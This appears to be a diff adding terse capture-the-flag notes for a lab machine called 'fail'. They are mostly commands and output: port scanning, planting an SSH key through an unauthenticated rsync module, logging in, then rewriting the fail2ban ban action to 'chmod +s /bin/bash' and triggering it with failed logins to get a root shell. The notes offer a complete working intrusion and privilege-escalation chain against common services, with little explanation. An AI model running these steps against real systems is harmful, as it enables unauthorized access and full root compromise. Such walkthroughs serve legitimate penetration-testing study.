@@ -1,0 +1,85 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.242.126 > Fail.txt
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
+|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
+|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
+873/tcp open  rsync   (protocol version 31)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ rsync rsync://fox@192.168.242.126/
+
+$ ssh-keygen -f fox
+Generating public/private ed25519 key pair.
+Enter passphrase for "fox" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in fox
+Your public key has been saved in fox.pub
+The key fingerprint is:
+SHA256:/0+jrb8Tu0tYzjJJ/pTCCVUkdjLCafzzfJidb2j6UXs alan@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|         o..=.+  |
+|          =o *   |
+|         . ..    |
+|           .o    |
+|        S . .+.+o|
+|         . = B*++|
+|          . X X*E|
+|           . @=o+|
+|            =BX* |
++----[SHA256]-----+
+
+$ mv fox.pub authorized_keys
+$ chmod 600 id_rsa
+$ mkdir .ssh
+# move id_rsa and authorized_keys to .ssh
+$ rsync -av .ssh rsync://192.168.242.126/fox/
+sending incremental file list
+.ssh/
+.ssh/authorized_keys
+.ssh/id_rsa
+
+$ ssh -i .ssh/id_rsa fox@192.168.242.126
+Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+$ id
+uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
+
+Linux version 4.19.0-12-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.152-1 (2020-10-18)
+
+pspy64
+2026/07/13 23:20:02 CMD: UID=0     PID=2507   | /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+
+fox@fail:/etc/fail2ban/action.d$ cat iptables-multiport.conf
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionban = chmod +s /bin/bash # Change this line 
+
+# Option:  actionunban
+# Notes.:  command executed when unbanning an IP. Take care that the
+#          command is executed with Fail2Ban user rights.
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionunban = chmod +s /bin/bash # Change this line
+
+# In another shell, use login in fail to trigger fail2ban 
+$ ssh fox@192.168.242.126
+fox@192.168.242.126's password: 
+Permission denied, please try again.
+
+fox@fail:/tmp$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+fox@fail:/tmp$ /bin/bash -p
+bash-5.0# id
+uid=1000(fox) gid=1001(fox) euid=0(root) egid=0(root) groups=0(root),1000(fail2ban),1001(fox)
+
